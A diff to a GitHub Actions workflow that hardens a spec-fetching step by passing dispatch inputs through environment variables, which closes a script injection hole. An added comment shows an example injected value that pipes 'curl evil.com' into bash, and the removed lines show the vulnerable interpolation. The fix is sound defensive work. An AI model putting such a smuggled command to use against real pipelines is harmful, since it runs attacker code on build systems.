@@ -99,13 +99,23 @@ jobs:
         run: docker pull openapitools/openapi-generator-cli:v7.16.0
 
       # ----- Fetch and validate ---------------------------------------------
+      # workflow_dispatch input values are passed through env vars rather
+      # than spliced directly into the run: script. ${{ inputs.* }} is
+      # expanded by GitHub before the shell sees it, so a crafted value
+      # like `"; curl evil.com | bash; echo "` would inject commands.
+      # Env-var substitution keeps the values inert (just bash variable
+      # expansion, not source-level interpolation).
       - name: Fetch spec + sidecars
         id: fetch
+        env:
+          SPEC_URL: ${{ inputs.spec_url }}
+          SHA256_URL: ${{ inputs.sha256_url }}
+          METADATA_URL: ${{ inputs.metadata_url }}
         run: |
           ARGS=()
-          [ -n "${{ inputs.spec_url }}" ] && ARGS+=(--spec-url "${{ inputs.spec_url }}")
-          [ -n "${{ inputs.sha256_url }}" ] && ARGS+=(--sha256-url "${{ inputs.sha256_url }}")
-          [ -n "${{ inputs.metadata_url }}" ] && ARGS+=(--metadata-url "${{ inputs.metadata_url }}")
+          [ -n "$SPEC_URL" ] && ARGS+=(--spec-url "$SPEC_URL")
+          [ -n "$SHA256_URL" ] && ARGS+=(--sha256-url "$SHA256_URL")
+          [ -n "$METADATA_URL" ] && ARGS+=(--metadata-url "$METADATA_URL")
           python scripts/fetch_spec.py "${ARGS[@]}"
 
       # If steps.fetch.outputs.changed != 'true', every subsequent step's
